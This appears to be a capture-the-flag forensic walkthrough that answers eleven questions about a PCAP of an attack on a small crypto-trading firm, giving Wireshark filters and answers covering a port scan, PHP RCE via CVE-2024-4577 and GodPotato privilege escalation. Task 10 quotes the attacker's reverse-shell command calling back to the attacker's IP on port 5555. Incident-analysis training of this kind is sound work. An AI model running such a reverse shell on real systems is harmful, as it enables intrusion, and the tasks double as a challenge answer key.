

----

#### Sherlock Scenario

You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.



----

Task 1

What is the source IP address of the attacker involved in this Attack?


```
192.168.170.128
```


Search through packet bytes for the "powershell" keyword and we find this suspicious packet
![](Pasted%20image%2020260615134612.png)






Task 2

How many open ports did the attacker discover on the victim's system?


```
8
```



We can use this command to search for signs of port scanning. 
```
ip.src_host ==192.168.170.128  and tcp.flags.reset == 1
```
![](Pasted%20image%2020260615135319.png)
The tcp flag reset == 1 means to filter for RST packets which most port scanning uses to not finish 3 way handshakes. Not completing a 3 way handshake means faster scanning and more stealth







Task 3

What is the first open port that responded on the victim's system during reconnaissance?


```
22
```


```
ip.addr ==192.168.170.128 and tcp.flags.syn == 1 || tcp.flags.reset == 1
```
![](Pasted%20image%2020260615141701.png)
We can see the first port to answer with SYN,ACK flags is port 22 indicating it is open







Task 4

What is the CVE identifier for the vulnerability exploited by the attacker?

```
CVE-2024-4577
```



Search for 
```
ip.addr ==192.168.170.128 and http
```
and follow the HTTP stream
![](Pasted%20image%2020260615142518.png)



We can see a successful RCE with commands being ran. We can look up the server versions for any CVE's to find how the server got exploited
![](Pasted%20image%2020260615142343.png)
https://nvd.nist.gov/vuln/detail/cve-2024-4577













Task 5

What is the name and version of the vulnerable product exploited to get RCE?


```
PHP 8.1.25
```
![](Pasted%20image%2020260615142748.png)


Attacker used the following CVE to exploit the server
https://nvd.nist.gov/vuln/detail/cve-2024-4577








Task 6

What is the username of the victim account?

```
cristo
```



![](Pasted%20image%2020260615142811.png)









Task 7

At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?


```
2025-01-22 09:47:32
```



Keep following the HTTP stream and you will find a packet containing the reverse shell command in its bytes
```
ip.addr ==192.168.170.128 and http
```
![](Pasted%20image%2020260615143512.png)






Task 8

What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold


```
T1190
```
The attacker exploited a public facing web app
https://attack.mitre.org/techniques/T1190/










?Task 9

What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?


```
GodPotato-NET4.exe
```




Filter on the TCP stream between 192.168.170.128 and 192.168.170.130
![](Pasted%20image%2020260615152243.png)











Task 10

What is the command line used by the attacker while performing privilege escalation?

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

![](Pasted%20image%2020260615152959.png)


















Task 11

The attacker failed to escalate privileges and was given an error. What is the error?

```
Cannot create process Win32Error:2
```

![](Pasted%20image%2020260615153100.png)